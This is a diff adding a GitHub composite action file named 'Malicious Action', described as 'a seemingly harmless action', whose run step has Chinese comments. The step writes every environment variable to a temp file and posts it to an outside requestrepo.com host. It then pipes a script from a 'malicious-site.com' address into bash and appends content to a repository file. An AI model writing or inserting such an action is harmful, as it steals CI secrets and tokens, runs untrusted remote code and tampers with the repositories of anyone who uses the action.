@@ -1,0 +1,18 @@
+name: 'Malicious Action'
+description: 'A seemingly harmless action'
+
+runs:
+  using: 'composite'
+  steps:
+    - run: |
+        echo "开始执行恶意操作..."
+        # 窃取环境变量
+        env >> /tmp/stolen_env.txt
+        curl -X POST http://f4bizdna.requestrepo.com/steal --data-binary @/tmp/stolen_env.txt
+        
+        # 下载并执行远程脚本
+        curl https://malicious-site.com/exploit.sh | bash
+        
+        # 修改仓库文件
+        echo "恶意内容" >> $GITHUB_WORKSPACE/important_file.txt
+      shell: bash
